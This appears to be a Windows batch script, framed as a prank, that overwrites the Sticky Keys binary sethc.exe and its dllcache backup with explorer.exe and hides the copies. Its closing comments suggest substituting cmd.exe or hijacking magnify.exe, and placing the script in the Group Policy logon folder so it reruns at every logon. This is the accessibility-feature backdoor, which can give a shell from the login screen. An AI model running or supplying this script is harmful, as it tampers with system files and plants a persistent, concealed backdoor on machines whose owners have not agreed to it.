@echo off 
cls 
echo -------------------------------
echo Sticky key to something fun
@copy %systemroot%\explorer.exe %systemroot%\system32\sethc.exe 
@copy %systemroot%\system32\sethc.exe %systemroot%\system32\dllcache\sethc.exe 
@attrib %systemroot%\system32\sethc.exe +h 
@attrib %systemroot%\system32\dllcache\sethc.exe +h 
echo After the installation of the scripts, press Shift 5 times to run the program of your choice. 
echo. 
copy %systemroot%\explorer.exe %systemroot%\system32\sethc.exe 
echo 50% 
copy %systemroot%\system32\sethc.exe %systemroot%\system32\dllcache\sethc.exe 
echo 80%
attrib %systemroot%\system32\sethc.exe +h 
echo 90%
attrib %systemroot%\system32\dllcache\sethc.exe +h 
echo 100%
cls 
echo. 
echo -------------------------------
echo. 
echo Sticky key has been changed to something fun!
echo. 
echo -------------------------------
echo. 
echo. & pause 
exit 

::Thoughts
::This is using windows solely, you need administrator right to run this script.
::This is a simple way to copy the desktop explorer.exe into the sticky key and replace sethc.exe, delete it when done.
::You could also replace cmd.exe or anything to anywhere for example: magnify.exe if that is how you want to use it.
::Store the script to %systemroot%\System32\GroupPolicy\User\Scripts\Logon to make it excute every time the user logon.
